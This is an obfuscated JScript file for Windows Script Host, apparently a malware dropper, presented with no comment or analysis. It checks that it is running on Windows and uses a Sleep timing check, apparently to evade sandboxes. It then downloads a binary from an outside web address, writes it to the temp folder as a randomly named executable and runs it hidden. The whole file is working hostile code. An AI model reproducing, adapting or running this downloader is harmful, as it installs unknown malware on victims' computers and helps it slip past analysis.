var h = false;
var W = "CreateObject";
var XW = function H() {return WScript[W]("WScript.Shell");}(), p = 11;
var HK = "MSXML2.XMLHTTP";
var th = 2123213;
var r = 0;
function n(tu){XW["Run"](tu, r, r);};
function L(){return "" + HK;};
function Xy(s, t){r = r * 1; return s - t;};
function dP(){return W;};
/*@cc_on
  @if (@_win32 || @_win64)
    h = true;
  @end
@*/
if (h)
{
var sN = "";
function tT(){return 22;};
var Vd = 0; var U0 = 0;
function b()
{
var D = new this["Date"]();
var J = D["getUTCMilliseconds"]();
WScript["Sleep"](tT());
var D = new this["Date"]();
var r0 = D["getUTCMilliseconds"]();
WScript["Sleep"](tT());
var D = new this["Date"]();
var Tt = D["getUTCMilliseconds"]();
var Vd = "oa";
Vd = Xy(r0, J);
var U0 = "j";
U0 = Xy(Tt, r0);
sN = "open";
return Xy(Vd, U0);
}
var Y = false;
var w = false;
for (var x = r; x < tT() * 1; x++){if (b() != r){
Y = true; 
U0 = "31" + 11 * Vd + U0; 
w = true; 
break;
}}
function kA() {return ((Y == true) && (Y == w)) ? 1 : r;};
if (Y && kA() && w){
function Cz() {return XW["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "GIZ8u604mmH5Kkw.exe";};
 G = L();
 aU = WScript[W](G);
 var Vu = 1;
 while (Vu){
try {
aU[sN]("GET", "http://blog.saletron.net/li9soz", false);
aU["send"]();
lP = "Sleep";
for (;;){WScript[lP](tT() * 11); if (aU["readystate"] >= 2 * 2) break;};
Vu = r;
} catch(mW){};
}
function u(U) {var a = (1, 2, 3, 4, 5, U); return a;};
to = WScript[dP()]("ADODB.Stream");
G = to;
G[sN]();
G["type"] = u(1);
G["write"](aU["ResponseBody"]);
to["position"] = u(r);
G["Save" + "ToFile"](Cz(), 2);
to["c"+"lose"]();
tv = Cz();
n(tv);
}
}

